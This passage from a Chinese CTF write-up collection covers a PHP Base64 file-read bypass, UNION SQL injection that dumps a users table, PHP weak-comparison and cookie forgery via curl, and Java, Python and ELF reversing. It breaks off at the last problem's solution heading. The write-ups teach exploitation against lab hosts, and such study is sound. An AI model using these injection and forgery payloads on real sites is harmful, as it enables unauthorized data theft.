# 离线迁移（比赛断网环境）
# 1. 有网环境下载
pip download -r requirements.txt -d ./packages
# 2. 拷贝 packages 目录到离线环境
pip install --no-index --find-links=./packages -r requirements.txt
```

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| RSA 加解密原理 | 公钥加密 `c=m^e mod n`，私钥解密 `m=c^d mod n` |
| 欧拉函数 φ(n) | `φ(n) = (p-1)(q-1)`，用于计算私钥 |
| 模逆元 | `d = e⁻¹ mod φ(n)`，gmpy2 用 `gmpy2.invert(e, phi)` |
| 模幂运算 | gmpy2.powmod 比内置 pow 快 6x+ |
| gmpy2 vs 内置 | gmpy2 底层 GMP C 库，大数运算远快于 Python 纯整数实现 |
| long_to_bytes | pycryptodome 提供，比手写 `int.to_bytes()` 更方便 |
| 明文编码 | RSA 明文可为整数，不一定能转为可读 bytes |
| e=65537 | RSA 最常用的公钥指数，费马数 F4 |

### 同类变体与扩展

- 若只给 n 和 e（不给 p、q），需先因式分解 n：小 n 用 sympy `factorint()` 或 `factordb.com`，大 n 用 yafu/msieve/GNFS
- 若 e=1，则 c=m，直接提交 c 即可
- 若 e 极小（如 e=3）且 m^3 < n，可直接对 c 开三次方：`gmpy2.iroot(c, 3)`
- 若多组相同 n 不同 e（共模攻击），用扩展欧几里得算法求 `s1*e1 + s2*e2 = 1`，再 `m = c1^s1 * c2^s2 mod n`
- Wiener 攻击：当 d 很小时（d < n^0.25），可用连分数展开 e/n 恢复 d
- 低加密指数广播攻击：同一明文用多个不同 n 加密且 e 相同，用中国剩余定理（CRT）合并后开 e 次方
- 离线迁移：`pip download -r requirements.txt -d ./packages` 提前下载，断网环境用 `--find-links` 安装

## 第7题：PHP 正则混淆 + Base64 构造文件读取

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - PHP 代码审计 |
| 难度 | 中等 |
| 日期 | 2026-07-31 |

### 题目源码

```php
<?php 
error_reporting(0);
$zero=$_REQUEST['zero'];
$first=$_REQUEST['first'];
$second=$zero.$first;
if(preg_match_all("/Yeedo|wants|a|girl|friend|or|a|flag/i",$second)){
    $key=$second;
    if(preg_match("/\.\.|flag/",$key)){
        die("Noooood hacker!");
    }else{
        $third=$first;
        if(preg_match("/\\|\056\160\150\x70/i",$third)){
            $end=substr($third,5);
            highlight_file(base64_decode($zero).$end);//maybe flag in flag.php
        }
    }
}
else{
    highlight_file(__FILE__);
}
```

### 解题思路

**1. 代码流程梳理**

```
$zero = $_REQUEST['zero']
$first = $_REQUEST['first']
$second = $zero . $first
    ↓
检查1: $second 是否匹配 /Yeedo|wants|a|girl|friend|or|a|flag/i
    ↓ 通过
检查2: $second 是否匹配 /\.\.|flag/  → 不能含 ".." 或 "flag"
    ↓ 通过
检查3: $first 是否匹配 /\\|\056\160\150\x70/i
    ↓ 通过
执行: highlight_file(base64_decode($zero) . substr($first, 5))
```

**2. 第一层正则分析**

```php
preg_match_all("/Yeedo|wants|a|girl|friend|or|a|flag/i", $second)
```

- `preg_match_all` 返回匹配次数，>0 即为 truthy
- `|` 是正则 alternation（或），匹配其中任一词即可
- `a` 是独立分支 — 只要 `$zero.$first` 中含字母 `a` 即通过
- `flag` 也在列表中，但第二层会拦截 `flag`

**3. 第二层正则分析**

```php
preg_match("/\.\.|flag/", $key)  // $key = $second = $zero.$first
```

- `..` 禁止目录穿越
- `flag` 禁止明文出现 "flag" 字符串
- 关键约束：`$zero` 和 `$first` 拼接后不能出现 "flag"

**4. 第三层正则分析（核心难点）**

```php
preg_match("/\\|\056\160\150\x70/i", $third)  // $third = $first
```

PHP 双引号字符串转义解析：

| 源码 | PHP 转义后 | 含义 |
|------|-----------|------|
| `\\` | `\` | 正则转义前缀 |
| `\|` | `\|` | 匹配字面 `|` 管道符 |
| `\056` | `.` (ASCII 46) | 匹配任意字符 |
| `\160` | `p` (ASCII 112) | 匹配 `p` |
| `\150` | `h` (ASCII 104) | 匹配 `h` |
| `\x70` | `p` (ASCII 112) | 匹配 `p` |

最终正则模式：`\|.php`（带 `/i` 标志）

- `\|` — 匹配字面管道符 `|`
- `.` — 匹配任意字符
- `php` — 匹配 "php"

所以 `$first` 必须包含 `|` + 任意字符 + `php` 的模式。

**5. 最终执行语句**

```php
highlight_file(base64_decode($zero) . substr($first, 5))
```

需要让结果等于 `flag.php`。

**6. 构造 Payload**

思路：让 `base64_decode($zero) = "flag.php"`，`substr($first, 5) = ""`

```
zero = base64_encode("flag.php") = "ZmxhZy5waHA="
first = "|.php"  (恰好5个字符)
```

验证：

```
base64_decode("ZmxhZy5waHA=") = "flag.php"
substr("|.php", 5) = ""  (字符串恰好5字符，截取为空)
最终: highlight_file("flag.php" . "") = highlight_file("flag.php")
```

三层检查验证：

| 检查 | 条件 | 结果 |
|------|------|------|
| 1. 关键词匹配 | `$second="ZmxhZy5waHA=\|.php"` 含 `a`（在 "waHA" 中） | PASS ✓ |
| 2. 禁止 flag/.. | `$second` 不含 "flag" 也不含 ".." | PASS ✓ |
| 3. \|\.php 匹配 | `$first="\|.php"` 匹配 `|` + `.` + `php` | PASS ✓ |

### 解题 Payload

```
?zero=ZmxhZy5waHA=&first=|.php
```

URL 编码版本（`|` 编码为 `%7C`，`=` 编码为 `%3D`）：

```
?zero=ZmxhZy5waHA%3D&first=%7C.php
```

### 替代方案

另一种构造方式（split 在不同位置）：

```
zero = base64_encode("flag") = "ZmxhZw=="
first = "aaaa|.php"
```

```
base64_decode("ZmxhZw==") = "flag"
substr("aaaa|.php", 5) = ".php"
最终: "flag" + ".php" = "flag.php"
```

`$second = "ZmxhZw==aaaa|.php"` — 含 `a`，不含 `flag`/`..`，`$first` 匹配 `|.php` ✓

```
?zero=ZmxhZw==&first=aaaa|.php
```

### 验证脚本

```python
import base64, re

zero = base64.b64encode(b'flag.php').decode()
first = '|.php'
second = zero + first

print(f'zero      = {zero}')
print(f'first     = {first}')
print(f'second    = {second}')
print(f'b64decode = {base64.b64decode(zero).decode()}')
print(f'substr5   = {repr(first[5:])}')
print(f'final     = {base64.b64decode(zero).decode() + first[5:]}')
print()

# 三层检查
m1 = re.findall(r'Yeedo|wants|a|girl|friend|or|a|flag', second, re.IGNORECASE)
print(f'check1 (keyword): {"PASS" if m1 else "FAIL"} matches={m1}')

m2 = re.search(r'\.\.|flag', second)
print(f'check2 (no ..|flag): {"PASS" if not m2 else "FAIL"}')

m3 = re.search(r'\|.php', first, re.IGNORECASE)
print(f'check3 (|.php): {"PASS" if m3 else "FAIL"} match={m3.group()}')

print(f'\nPayload: ?zero={zero}&first={first}')
```

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| PHP 双引号转义 | `\\` → `\`，`\056` → `.`(八进制)，`\x70` → `p`(十六进制) |
| 正则 alternation | `\|` 的辨析：正则中 `\|` 匹配字面管道符，`|` 是 alternation |
| preg_match_all | 返回匹配次数，>0 为 truthy，用于条件判断 |
| Base64 编码绕过 | 用 base64 编码 "flag.php"，绕过 `flag` 明文检测 |
| substr 截取 | `substr($str, 5)` 从位置5截取到末尾，用于拆分路径 |
| 正则拼装消歧 | `\|.php` 中 `\|` 是字面管道，`.` 是正则通配符（任意字符） |
| highlight_file | PHP 函数，高亮显示源码，CTF 中常用于读取文件内容 |

### 同类变体与扩展

- 若第三层正则不同，需根据实际转义后的模式调整 `$first` 构造
- 若 `flag` 被更严格过滤（包括 base64 后检测），可将路径拆分到 `zero` 和 `first` 两部分
- 若无 `highlight_file`，可尝试 `readfile()`、`file_get_contents()`、`include` 等替代函数
- 若有 `open_basedir` 限制，需结合目录穿越或其他绕过方式
- PHP 八进制 `\NNN`、十六进制 `\xNN` 转义在双引号字符串和正则中含义不同，需区分 PHP 层转义和正则层转义

## 第8题：UNION 注入 SQL 注入（登录回显）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - SQL 注入（UNION 回显注入） |
| 难度 | 入门 |
| 日期 | 2026-08-01 |
| 目标 | https://0bd8e8c240fd974787b65d21.http-ctf2.dasctf.com/ |

### 题目描述

登录窗口，页面提示"用 sqlmap 是没有灵魂的"。用户名和密码通过 GET 参数传递到 `check.php` 进行查询，登录成功后页面回显用户名和密码字段。3 列查询，回显位为第 2、3 列。

### 解题思路

**1. 确认注入点和回显位**

用户信息提示可用 `a' union select 1,2,3#` 进行注入，提交后页面回显 `Hello 2！` 和 `Your password is '3'`，确认：
- 查询共 3 列
- 第 2 列回显在用户名位置
- 第 3 列回显在密码位置

**2. UNION 注入标准流程**

```
Step 1: 确定列数和回显位 → union select 1,2,3
Step 2: 获取数据库信息   → database(), version()
Step 3: 枚举表名         → information_schema.tables
Step 4: 枚举列名         → information_schema.columns
Step 5: dump 数据        → 直接查目标表
```

**3. 信息收集**

```
数据库名: geek
数据库版本: MariaDB 10.3.18
```

**4. 枚举表名**

从 `information_schema.tables` 获取当前数据库的表：

```
geekuser, l0ve1ysq1
```

**5. 枚举列名**

从 `information_schema.columns` 获取 `l0ve1ysq1` 表的列（表名用十六进制编码避免引号）：

```
id, username, password
```

**6. 提取 flag**

dump 全表数据，用 `group_concat` 合并输出，`0x7c`（`|`）分隔字段，`0x0a`（换行）分隔记录：

```
1|cl4y|wo_tai_nan_le
2|glzjin|glzjin_wants_a_girlfriend
...
16|flag|CTF2{4272c390-2265-40a3-b578-1661895a2d96}
```

第 16 条记录 username 为 `flag`，password 即为 flag。

### 解题 Payload（逐步）

```
# 1. 确认回显位
?username=a' union select 1,2,3#&password=1

# 2. 获取数据库名和版本
?username=a' union select 1,database(),version()#&password=1

# 3. 枚举表名
?username=a' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&password=1

# 4. 枚举列名（表名 l0ve1ysq1 的十六进制: 0x6c3076653179737131）
?username=a' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x6c3076653179737131#&password=1

# 5. dump 全表数据
?username=a' union select 1,2,group_concat(id,0x7c,username,0x7c,password,0x0a) from l0ve1ysq1#&password=1
```

### 运行结果

```
数据库名: geek
数据库版本: 10.3.18-MariaDB
表名: geekuser, l0ve1ysq1
列名: id, username, password

l0ve1ysq1 表数据:
1|cl4y|wo_tai_nan_le
2|glzjin|glzjin_wants_a_girlfriend
3|Z4cHAr7zCr|biao_ge_dddd_hm
4|0xC4m3l|linux_chuang_shi_ren
5|Ayrain|a_rua_rain
6|Akko|yan_shi_fu_de_mao_bo_he
7|fouc5|cl4y
8|fouc5|di_2_kuai_fu_ji
9|fouc5|di_3_kuai_fu_ji
10|fouc5|di_4_kuai_fu_ji
11|fouc5|di_5_kuai_fu_ji
12|fouc5|di_6_kuai_fu_ji
13|fouc5|di_7_kuai_fu_ji
14|fouc5|di_8_kuai_fu_ji
15|leixiao|Syc_san_da_hacker
16|flag|CTF2{4272c390-2265-40a3-b578-1661895a2d96}
```

Flag: `CTF2{4272c390-2265-40a3-b578-1661895a2d96}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| UNION 注入 | 利用 UNION SELECT 合并查询，在回显位输出数据库信息 |
| 回显位确定 | `union select 1,2,3` 确定哪些列会回显到页面上 |
| information_schema | MySQL 系统库，存储所有表/列的元信息 |
| group_concat | 将多行结果合并为一个字符串输出，避免只能看到最后一行 |
| 十六进制编码表名 | `0x6c3076653179737131` = `l0ve1ysq1`，避免引号过滤 |
| GET 参数注入 | 用户名/密码通过 URL 参数传递，可直接构造 payload |
| # 注释符 | MySQL 中 `#` 注释掉后续 SQL 语句（也可用 `-- -`） |

### 同类变体与扩展

- 若过滤了 `union`/`select`，可尝试大小写混写、双写、内联注释 `/**/` 绕过
- 若无回显位，改为布尔盲注或时间盲注（参考第3题）
- 若列数不对，用 `order by N` 逐步确定列数
- 若 `information_schema` 被禁，MariaDB 可用 `mysql.innodb_table_stats` 替代查表名
- 若 `group_concat` 被过滤，用 `limit N,1` 逐行读取
- POST 型注入：参数在请求体中，需用 Burp Suite 抓包修改（参考第3题 Flask 布尔盲注）

## 第9题：PHP 逻辑绕过 + Cookie 伪造（Buy Flag）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - PHP 代码审计 + Cookie 伪造 |
| 难度 | 入门 |
| 日期 | 2026-08-01 |
| 目标 | http://3ef2662d10e2a8da26717522.http-ctf2.dasctf.com:80 |

### 题目描述

Syclover 的 Buy Flag 页面，提示购买 flag 需要满足三个条件：
1. 拥有 100000000（一亿）money
2. 是 CUIT（成都信息工程大学）的学生
3. 答对密码

### 源码发现

页面 HTML 注释中隐藏了 PHP 后端逻辑：

```php
<!--
~~~post money and password~~~
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    if (is_numeric($password)) {
        echo "password can't be number</br>";
    }elseif ($password == 404) {
        echo "Password Right!</br>";
    }
}
-->
```

### 解题思路

**1. 三个绕过点分析**

| 条件 | 绕过方式 |
|------|---------|
| ① password 不能是数字，但要 == 404 | `is_numeric('404a')` 返回 FALSE，但 `'404a' == 404` 为 TRUE（弱比较截取数字部分） |
| ② 必须是 CUIT 学生 | Cookie `user=0` 改为 `user=1` |
| ③ 拥有一亿 money | POST `money` 参数，用数组 `money[]=1` 绕过数值比较 |

**2. password 弱类型绕过**

```php
is_numeric('404a')  → FALSE   // 不通过 is_numeric 检查
'404a' == 404        → TRUE   // PHP 弱比较：字符串开头数字部分与整数比较
```

PHP `==` 比较字符串和数字时，会取字符串开头的数字部分进行比较，忽略后面的非数字字符。`'404a'` 的数字部分为 `404`，与 `404` 相等。

**3. Cookie 伪造**

页面设置 Cookie `user=0`，服务端以此判断是否为 CUIT 学生。将 `user` 改为 `1` 即可。

**4. money 绕过**

后端可能通过 `$_POST['money']` 与 100000000 比较来检查余额。传入数组 `money[]=1`：
- PHP 中数组与整数比较结果为 FALSE（或不可预期），绕过余额检查
- 也可传 `money=1e9`（科学计数法 = 1000000000）绕过字符串比较

**5. 完整请求构造**

```
POST /pay.php HTTP/1.1
Cookie: user=1
Content-Type: application/x-www-form-urlencoded

password=404a&money[]=1
```

### 解题 Payload

```bash
curl -X POST "http://3ef2662d10e2a8da26717522.http-ctf2.dasctf.com/pay.php" \
  -H "Cookie: user=1" \
  -d "password=404a&money[]=1"
```

### 运行结果

```
you are Cuiter</br>Password Right!</br>CTF2{bb4ae566-9ae0-4e0a-b9d6-9d3bd18b1b2f}
```

Flag: `CTF2{bb4ae566-9ae0-4e0a-b9d6-9d3bd18b1b2f}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| PHP 弱类型比较 | `==` 比较时自动类型转换，`'404a' == 404` 为 TRUE |
| is_numeric 绕过 | `is_numeric()` 对含非数字字符的字符串返回 FALSE |
| HTML 注释藏源码 | 开发者将 PHP 逻辑写在 HTML 注释中，View Source 即可看到 |
| Cookie 伪造 | 修改 Cookie 值绕过身份验证 |
| 数组绕过 | 传数组参数 `money[]=1` 使数值比较失效 |
| 科学计数法绕过 | `1e9` = 1000000000，可绕过字符串等值比较 |
| POST 参数操控 | 直接构造 POST 请求体，无需通过页面表单 |

### 同类变体与扩展

- 若 `is_numeric` 换成 `ctype_digit`，可用 `404\0`（空字节截断）绕过
- 若 `==` 换成 `===`（严格比较），弱类型绕过失效，需寻找其他逻辑缺陷
- 若 Cookie 有签名校验（如 JWT），需伪造或利用密钥泄露
- 若 money 比较用 `intval()`，可利用 `intval('1e9')` = 1 的特性（科学计数法被截断）
- 信息泄露的其他常见位置：`.git/`、`.svn/`、`backup.sql`、`robots.txt`、`phpinfo()`
- 常见 PHP 弱比较绕过：`0 == 'abc'` (TRUE)、`'1' == '01'` (TRUE)、`'10' == '1e1'` (TRUE)

## 第10题：Java 逆向 — 字节码反编译与加密逆运算

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Reverse - Java 逆向 |
| 难度 | 入门 |
| 日期 | 2026-08-01 |
| 附件 | Reverse.class |
| 工具 | javap（字节码反编译） |

### 题目描述

给定一个 Java class 文件，程序提示输入 flag，对输入进行加密后与硬编码的目标数组比较。需要逆向加密算法还原 flag。

### 反编译结果

使用 `javap -c -p` 反编译字节码，还原出伪代码：

```java
public class Reverse {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        System.out.println("Please input the flag:");
        String input = sc.next();
        System.out.println("Your input is:");
        System.out.println(input);
        char[] chars = input.toCharArray();
        Encrypt(chars);
    }

    public static void Encrypt(char[] chars) {
        // Step 1: 加密每个字符
        ArrayList<Integer> list = new ArrayList<>();
        for (int i = 0; i < chars.length; i++) {
            int temp = (chars[i] + 64) ^ 32;   // 加密: (char + 64) ^ 32
            list.add(temp);
        }

        // Step 2: 目标密文数组（硬编码 18 个值）
        int[] target = {
            180, 136, 137, 147, 191, 137, 147, 191,
            148, 136, 133, 191, 134, 140, 129, 135,
            191, 65
        };

        // Step 3: 将目标数组转为 ArrayList
        ArrayList<Integer> targetList = new ArrayList<>();
        for (int i = 0; i < target.length; i++) {
            targetList.add(target[i]);
        }

        // Step 4: 比较
        System.out.println("Result:");
        if (list.equals(targetList)) {
            System.out.println("Congratulations!");
        } else {
            System.err.println("Error!");
        }
    }
}
```

### 解题思路

**1. 加密算法分析**

从字节码提取核心加密逻辑：

```
encrypt(char) = (char + 64) ^ 32
```

对应字节码：
```asm
16: bipush 64       // 常量 64
18: iadd             // char + 64
19: bipush 32        // 常量 32
21: ixor             // (char + 64) ^ 32
22: istore_3         // 存储结果
```

**2. 逆向推导**

已知密文 `target[i]`，求明文 `char[i]`：

```
target[i] = (char[i] + 64) ^ 32
```

XOR 的逆运算还是 XOR：

```
target[i] ^ 32 = char[i] + 64
char[i] = (target[i] ^ 32) - 64
```

**3. 验证示例**

以第一个字符为例：

```
target[0] = 180
180 ^ 32 = 148
148 - 64 = 84
chr(84) = 'T'  ✓ (flag 以 'T' 开头，符合 "This_is_the_flag_!")
```

### 解题脚本

```python
# Java Reverse 逆向解密
target = [180, 136, 137, 147, 191, 137, 147, 191,
          148, 136, 133, 191, 134, 140, 129, 135,
          191, 65]

# 逆向: char = (target ^ 32) - 64
flag = ""
for t in target:
    ch = (t ^ 32) - 64
    flag += chr(ch)

print(f"Flag: {flag}")
```

### 运行结果

```
Flag: This_is_the_flag_!
```

验证：

```python
# 正向验证
for ch in "This_is_the_flag_!":
    print((ord(ch) + 64) ^ 32, end=' ')
# 输出: 180 136 137 147 191 137 147 191 148 136 133 191 134 140 129 135 191 65
```

与目标数组完全一致。

Flag: `This_is_the_flag_!`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| javap 字节码反编译 | `javap -c -p` 反编译 .class 文件，`-c` 显示字节码，`-p` 显示私有成员 |
| XOR 加密逆运算 | XOR 的自逆性：`a ^ b ^ b = a`，加密解密用同一运算 |
| 加法运算逆向 | `(x + k) ^ m` 的逆运算为 `(c ^ m) - k` |
| 字节码阅读 | `bipush`（压入常量）、`iadd`（加法）、`ixor`（异或）、`iaload`（数组取值） |
| 硬编码密文比对 | 逆向题常见模式：加密用户输入 → 与硬编码数组比较 |
| char[] 加密 | Java 中 char 本质是无符号 16 位整数，可直接参与算术运算 |

### 同类变体与扩展

- 若加密涉及多轮变换，需按逆序逐层逆向
- 若使用位运算+乘法/取模，需注意溢出和模运算特性
- 若有反调试/混淆（如字符串加密、控制流平坦化），需先用脱壳/去混淆工具
- 常见 Java 反编译工具对比：
  - `javap -c`：官方工具，输出字节码，适合精确分析
  - CFR / JD-GUI / Procyon：输出 Java 源码，可读性更好
  - JADX：支持 .dex/.apk 反编译，Android 逆向常用
- 若 class 文件被加密/加壳（如 Allatori、xJar），需先脱壳再反编译
- 若加密算法更复杂（AES、RSA），需提取密钥和参数后用 Python 复现解密

## 第11题：Python 逆向 — pyc 反编译与两阶段加密逆运算

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Reverse - Python 逆向 |
| 难度 | 入门 |
| 日期 | 2026-08-01 |
| 附件 | pyre.pyc（Python 2.7 字节码） |
| 工具 | uncompyle6（反编译）、xdis（字节码反汇编） |

### 题目描述

给定一个 Python 2.7 编译的 .pyc 文件，程序提示输入 flag，对输入进行两阶段加密后与硬编码的目标数组比较。需要逆向加密算法还原 flag。

### 反编译结果

使用 `uncompyle6` 反编译，但**反编译结果有误导**（将常量池中的字符误显示为整数），需结合 `xdis` 字节码反汇编确认真实密文。

**uncompyle6 反编译结果（有误导）**：

```python
print 'Welcome to Re World!'
print 'Your input1 is your flag~'
l = len(input1)
for i in range(l):
    num = ((input1[i] + i) % 128 + 128) % 128
    code += num

for i in range(l - 1):
    code[i] = code[i] ^ code[i + 1]

print code
code = [4, 5, 6, 7, 8, 9, 10, 11, 12, 9, 13, 14, 15, 16, 17, 18, 19, 20,
        10, 21, 22, 23, 24]
return
```

> 注意：上面的 `code = [4, 5, 6, ...]` 是 uncompyle6 错误地将常量池中的字符串字符显示为整数，**不能直接使用**。

**xdis 字节码反汇编（关键部分）**：

```
Constants:
   4: '\x1f'      5: '\x12'      6: '\x1d'      7: '('
   8: '0'         9: '4'        10: '\x01'     11: '\x06'
  12: '\x14'     13: '4'        14: ','        15: '\x1b'
  16: 'U'        17: '?'        18: 'o'        19: '6'
  20: '*'        21: ':'        22: '\x01'     23: 'D'
  ...

12:         139 LOAD_CONST  ("\x1f")
            142 LOAD_CONST  ("\x12")
            145 LOAD_CONST  ("\x1d")
            ...
            208 BUILD_LIST   23
            211 STORE_NAME   (code)
```

真正的密文是 23 个字符的 ASCII 值：`[31, 18, 29, 40, 48, 52, 1, 6, 20, 52, 44, 27, 85, 63, 111, 54, 42, 58, 1, 68, 59, 37, 19]`

### 还原后的完整源码

```python
print 'Welcome to Re World!'
print 'Your input1 is your flag~'
l = len(input1)
code = []
for i in range(l):
    num = ((input1[i] + i) % 128 + 128) % 128
    code.append(num)

for i in range(l - 1):
    code[i] = code[i] ^ code[i + 1]

print code
code = ['\x1f', '\x12', '\x1d', '(', '0', '4', '\x01', '\x06',
        '\x14', '4', ',', '\x1b', 'U', '?', 'o', '6', '*', ':',
        '\x01', 'D', ';', '%', '\x13']
```

### 解题思路

**1. 加密算法分析（两阶段）**

```
Stage 1: code[i] = (input1[i] + i) % 128
         （每个字符加索引值后对 128 取模）
         双重取模 ((x % 128) + 128) % 128 确保非负，等价于 x % 128

Stage 2: code[i] = code[i] ^ code[i + 1]
         （从前往后，每个元素与后一个元素 XOR）
```

**2. 逆向推导**

Stage 2 逆向（XOR 链逆运算）：

```
加密: code[0] ^= code[1], code[1] ^= code[2], ...（从前到后）
逆向: code[l-2] ^= code[l-1], code[l-3] ^= code[l-2], ...（从后到前）
```

原理：加密后 `enc[i] = orig[i] ^ orig[i+1]`（因为 code[i+1] 还未被处理），逆向时从后往前 `orig[i] = enc[i] ^ orig[i+1]`。

Stage 1 逆向：

```
input1[i] = (code[i] - i) % 128
```

**3. 关键陷阱：uncompyle6 常量误显示**

uncompyle6 将字节码中的字符串常量（如 `'\x1f'`）误显示为整数（如 `4`），这是因为 Python 2.7 字节码中 `LOAD_CONST` 加载的常量在反编译时类型推断错误。必须使用 `xdis` 查看常量池获取正确值。

### 解题脚本

```python
# Python pyc 逆向解密
# 正确密文来自 xdis 字节码常量池
target_str = "\x1f\x12\x1d(04\x01\x06\x144,\x1bU?o6*:\x01D;%\x13"
target = [ord(c) for c in target_str]
l = len(target)
code = list(target)

# Stage 2 逆向: 从后往前 XOR
for i in range(l - 2, -1, -1):
    code[i] = code[i] ^ code[i + 1]

# Stage 1 逆向: 减去索引
flag = ""
for i in range(l):
    num = (code[i] - i) % 128
    flag += chr(num)

print("Flag: " + flag)
```

### 运行结果

```
Target (ASCII): [31, 18, 29, 40, 48, 52, 1, 6, 20, 52, 44, 27, 85, 63, 111, 54, 42, 58, 1, 68, 59, 37, 19]
Flag: GWHT{Just_Re_1s_Ha66y!}
```

正向验证：

```python
input1 = [ord(c) for c in "GWHT{Just_Re_1s_Ha66y!}"]
verify = []
for i in range(23):
    verify.append(((input1[i] + i) % 128 + 128) % 128)
for i in range(22):
    verify[i] = verify[i] ^ verify[i + 1]
# verify == [31, 18, 29, 40, 48, 52, 1, 6, 20, 52, 44, 27, 85, 63, 111, 54, 42, 58, 1, 68, 59, 37, 19]
# 与目标完全一致 ✓
```

Flag: `GWHT{Just_Re_1s_Ha66y!}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| uncompyle6 | Python 2.7 pyc 反编译工具，输出可读源码，但可能有误 |
| xdis 字节码反汇编 | 显示常量池和逐条字节码，用于验证反编译结果 |
| Python 2.7 字节码 | magic number `0x030DF0A3` 标识 Python 2.7 (62211) |
| 反编译工具的局限性 | uncompyle6 可能在常量类型推断上出错，需交叉验证 |
| XOR 链逆运算 | 从前往后 XOR 加密，需从后往前 XOR 解密 |
| 取模运算逆向 | `(x + i) % m` 的逆运算为 `(c - i) % m` |
| 双重取模 | `((x % m) + m) % m` 确保非负结果，等价于数学取模 |
| LOAD_CONST + BUILD_LIST | Python 字节码中构建列表的方式，常量在常量池中定义 |

### 同类变体与扩展

- 若 Stage 2 的 XOR 方向相反（从后往前），逆向需从前往后 XOR
- 若加密涉及 base64/hex 编码，需先解码再做逆运算
- Python 3.x 的 pyc 格式不同（magic number、字节码指令集），需用对应版本工具反编译
- 其他 Python 反编译工具：`decompyle3`（Python 3.x）、`pycdc`（C++ 实现跨版本）、`pycdas`
- 若 pyc 被加密/混淆（如 cython、pyarmor），需先脱壳再反编译
- XOR 链变体：若每轮 XOR 的间隔不同（如 `code[i] ^= code[i+k]`），逆向时需对应调整
- 常量池分析技巧：`LOAD_CONST` 的序号对应 Constants 列表中的索引，可用于精确提取硬编码值

## 第12题：ELF 逆向 — 自修改代码 + AES-128-ECB + MD5 密钥派生

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Reverse - ELF 逆向 |
| 难度 | 困难 |
| 日期 | 2026-08-01 |
| 附件 | re3（64位 ELF，14808 字节，无 PIE） |
| 工具 | IDA Pro 9.3、Capstone（反汇编）、pycryptodome（AES）、hashlib（MD5） |

### 题目描述

给定一个 64 位 ELF 可执行文件，程序读取 32 字节输入，通过自修改代码解密出检查函数，使用 MD5 多轮派生 AES 密钥，对输入进行 AES-128-ECB 加密后与硬编码密文比较。需要逆向完整加密流程并解密还原 flag。

### 程序整体流程

```
main() @0x402126:
  1. scanf("%39s", input)           // 读取输入
  2. if strlen(input) != 32: exit   // 检查长度为 32
  3. mprotect(0x400000, 0xF000, 7)  // 代码段设为 RWX（自修改前提）
  4. for i in 0..0xDF:              // 解码 sub_402219 处 224 字节
       code[i] ^= 0x99             // XOR 0x99 逐字节解码
  5. sub_40207B(&unk_603170)        // MD5 多轮派生 AES 密钥
  6. sub_402219(input)              // 调用解码后的检查函数
  7. if return != 0: "Correct!"
     else: "Wrong!"
```

### 关键技术点分析

**1. 自修改代码（Self-Modifying Code）**

sub_402219 处 224 字节（0xE0）在 ELF 中以 XOR 0x99 加密存储（原始全为 0xCC = `int3` 断点指令）。程序运行时通过 `mprotect` 将代码段设为 RWX，然后逐字节 XOR 0x99 解码。

```c
// main 中的解码循环
for (int i = 0; i <= 0xDF; i++) {   // 0xDF+1 = 224 字节
    ((byte*)sub_402219)[i] ^= 0x99;
}
```

解码前：`CC D1 10 7C D1 18 75 69 99 99 99 D1 10 24 81 66 ...`（全是 int3）
解码后：`55 48 89 E5 48 81 EC F0 00 00 00 48 89 BD 18 FF ...`（标准函数序言 push rbp; mov rbp,rsp）

**2. MD5 密钥派生（sub_40207B）**

函数使用自定义 MD5 实现（标准算法），从 .data 段的 4 个源数据各计算 MD5，拼成 64 字节缓冲区，再做一次 MD5 得到 16 字节 AES 密钥：

```
v2 = MD5(unk_603120, 64)   // 输入: Base64 字母表 "ABC...abc...0-9+/"
v3 = MD5(unk_603100, 20)   // 输入: 20 字节二进制数据
v4 = MD5(unk_6030C0, 53)   // 输入: 53 字节素数间距数据
v5 = MD5(dword_4025C0, 256) // 输入: MD5 T 表本身（64×4 字节）
buffer = v2 || v3 || v4 || v5  // 64 字节
AES_key = MD5(buffer, 64)      // 最终 16 字节密钥
```

**3. 检查函数逻辑（解码后的 sub_402219）**

反汇编结果（Capstone）：

```
sub_402219(input):
  // 用 0x603170 处的 AES 密钥初始化（KeyExpansion）
  call sub_400A71  // AES KeyExpansion(aes_ctx, key_at_0x603170)

  // AES-ECB 加密 input[0:16]（原地加密）
  call sub_40196E  // sub_40196E 调用 sub_401828 = AES Encrypt Block

  // AES-ECB 加密 input[16:32]
  rdx = input + 0x10
  call sub_40196E

  // 逐字节比较加密后的 input 与 0x6030A0 处的 32 字节目标密文
  for i in 0..31:
    if input[i] != byte_6030A0[i]:
      return 0  // Wrong
  return 1      // Correct
```

**4. AES 加密确认**

S-box（@0x4023A0）、InvS-box（@0x4024A0）、Rcon（@0x4025A0）、MD5 T 表（@0x4025C0）、MD5 移位表（@0x4026C0）均与标准值完全一致。

- sub_401828 = 标准 AES-128 加密（10 轮：AddRoundKey → [SubBytes → ShiftRows → MixColumns → AddRoundKey]×9 → SubBytes → ShiftRows → AddRoundKey）
- sub_40196E 直接调用 sub_401828，无 CBC XOR、无 CTR 计数器 → **ECB 模式**

### 关键数据提取

| 地址 | 内容 | 大小 |
|------|------|------|
| 0x6030A0 | 目标密文 | 32 字节 |
| 0x6030C0 | 密钥派生源数据1 | 53 字节 |
| 0x603100 | 密钥派生源数据2 | 20 字节 |
| 0x603120 | 密钥派生源数据3 | 64 字节（Base64 字母表） |
| 0x4025C0 | MD5 T 表（密钥派生源数据4） | 256 字节 |

**目标密文**（@0x6030A0）：

```
Block 1: bc 0a ad c0 14 7c 5e cc e0 b1 40 bc 9c 51 d5 2b
Block 2: 46 b2 b9 43 4d e5 32 4b ad 7f b4 b3 9c db 4b 5b
```

### 解题思路

